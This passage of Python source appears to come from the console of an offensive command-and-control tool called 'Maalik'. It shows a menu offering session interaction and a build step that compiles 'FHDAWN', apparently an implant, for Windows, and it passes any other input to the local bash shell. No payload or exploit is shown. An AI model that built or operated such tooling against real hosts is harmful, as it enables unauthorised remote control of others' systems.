                        -. session - interact with a session.
                        -. build - Build FHDAWN.
                        -. exit - Exit Maalik.
                        """
                        + Style.RESET_ALL)
                elif(x == "build"):
                    os.chdir("fhdawn")
                    if(os.name == "nt"):
                        subprocess.run(['mingw32-make', 'win-static'])
                        subprocess.run(['mingw32-make', 'build-win'])
                    else:
                        subprocess.run(['make', 'win-static'])
                        subprocess.run(['make', 'build-win'])
                    os.chdir("..")

                else:
                    if(len(x) > 0):
                        try:
                            print(Style.BRIGHT + Fore.LIGHTCYAN_EX )
                            subprocess.run(['bash', '-c', x])
                            print(Style.RESET_ALL)
                        except Exception as procError:
                            print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Error : " + str(procError))
        except KeyboardInterrupt:
            print("[X] Interrupt, Type exit to Exit.")

           